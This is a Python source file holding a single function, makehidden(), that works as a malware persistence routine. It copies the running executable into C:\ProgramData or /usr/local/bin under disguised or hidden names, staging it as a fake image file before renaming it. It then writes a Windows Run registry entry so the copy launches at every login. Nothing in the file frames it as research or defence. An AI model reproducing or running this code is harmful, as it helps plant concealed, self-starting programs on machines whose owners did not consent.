import os
import sys
import time
import subprocess
import shutil
from pathlib import Path


def makehidden():
    try:
        time.sleep(1)  # Initial delay

        # Determine target path based on OS
        if sys.platform == "win32":
            target_path = "C:\\ProgramData\\"
            target_file = "s_win32.exe"
            temp_file = "simg.png"
        else:
            target_path = "/usr/local/bin/"
            target_file = ".s_linux"
            temp_file = ".s_img"

        target_file_path = os.path.join(target_path, target_file)
        temp_file_path = os.path.join(target_path, temp_file)

        # Copy executable if it doesn't already exist in target location
        if not os.path.isfile(target_file_path):
            try:
                # Read current executable
                with open(sys.executable, "rb") as src_file:
                    bdata = src_file.read()
                    src_file.close()

                # Write to temporary file
                with open(temp_file_path, "wb") as dest_file:
                    dest_file.write(bdata)
                    dest_file.close()

                # Rename to final filename
                os.chdir(target_path)
                os.rename(temp_file, target_file)

                # Make executable on Linux
                if sys.platform != "win32":
                    os.chmod(target_file_path, 0o755)

            except (IOError, OSError, PermissionError) as e:
                print(f"Error copying executable: {e}")
                try:
                    os.remove(temp_file_path)
                except:
                    pass
                return False

        # Add to startup
        try:
            if sys.platform == "win32":
                # Windows registry method
                result = subprocess.run(
                    f'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v s_win32.exe /t REG_SZ /d "{target_file_path}"',
                    shell=True,
                    stderr=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                )
                if result.returncode != 0:
                    print(f"Registry add failed: {result.stderr.decode().strip()}")
            else:
                pass

        except:
            pass

    except Exception as e:
        print(f"Unexpected error in makehidden: {e}")
        return False
